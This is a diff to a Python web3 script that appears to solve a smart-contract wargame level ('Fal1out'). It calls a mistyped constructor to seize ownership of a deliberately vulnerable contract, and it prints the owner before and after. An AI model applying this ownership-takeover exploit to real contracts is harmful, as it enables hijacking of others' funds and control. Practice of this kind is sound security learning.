@@ -39,7 +39,7 @@ dict_output = parse_env_to_dict(ENV_PATH)
 
 RPC_URI = dict_output['WEB3_PROVIDER_URI']
 
-CONTRACT_ADDRESS = '0x7F3F7AaBEAc095c6aBAfB5d3dd48b72545758609'
+CONTRACT_ADDRESS = '0x8aCd85898458400f7Db866d53FCFF6f0D49741FF'
 PRIVATE_KEY = '0x' + dict_output['USER_ADDRESS_PRIVATE_KEY']
 
 web3 = Web3(Web3.HTTPProvider(RPC_URI))
@@ -132,15 +132,19 @@ CONTRACT_ABI = [
     }
 ]
 
+print('---- BEFORE TRANSACTION ----')
+
 contract = web3.eth.contract(address=CONTRACT_ADDRESS, abi=CONTRACT_ABI)
 
 BEFORE_OWNER = contract.functions.owner().call({'from': USER_ADDRESS})
 
 if BEFORE_OWNER != USER_ADDRESS:
-    print("Contract's Owner is not changed!")
+    print("Contract's Owner is not changed!\n")
 else:
-    print("Contract's Owner is already changed!")
+    print("Contract's Owner is already changed!\n")
     exit(0)
+
+print("1. Send transaction to allocate function for add user allocations information")
 
 # allocate 함수 호출하여 사전 세팅
 data = {
@@ -157,10 +161,13 @@ print(f"Transaction Hash: {web3.to_hex(tx_hash)}")
 
 # 트랜잭션 결과 확인
 tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
-print(f"Transaction Receipt: {tx_receipt}")
+print(f"Transaction Receipt: {tx_receipt}\n")
+
+print("2. Send transaction to Fal1out constructor for re-initialize owner address")
 
 # 생성자 호출 및 소유자 변경
 data = {
+    'from': USER_ADDRESS,
     'value': 1,
     'nonce': web3.eth.get_transaction_count(USER_ADDRESS),
 }
@@ -174,11 +181,13 @@ print(f"Transaction Hash: {web3.to_hex(tx_hash)}")
 
 # 트랜잭션 결과 확인
 tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
-print(f"Transaction Receipt: {tx_receipt}")
+print(f"Transaction Receipt: {tx_receipt}\n")
+
+print('---- AFTER TRANSACTION ----')
 
 AFTER_OWNER = contract.functions.owner().call({'from': USER_ADDRESS})
 
-print(AFTER_OWNER)
+print(f"Contract owner after transaction : {AFTER_OWNER}")
 
 if AFTER_OWNER != USER_ADDRESS:
     print("Contract's Owner has not changed!")
